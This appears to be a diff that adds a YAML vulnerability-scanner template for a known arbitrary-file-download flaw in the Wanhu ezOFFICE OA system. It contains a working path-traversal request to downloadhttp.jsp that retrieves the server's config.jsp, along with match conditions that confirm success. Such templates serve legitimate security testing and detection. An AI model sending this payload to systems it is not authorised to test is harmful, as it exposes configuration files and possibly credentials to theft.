@@ -1,0 +1,12 @@
+name: 万户OA-ezOFFICE-downloadhttp-任意文件下载
+description: >
+  任意文件下载
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /defaultroot/site/templatemanager/downloadhttp.jsp?fileName=../public/edit/jsp/config.jsp
+    expression:
+      status: 200
+      headers:
+        Content-Disposition: config
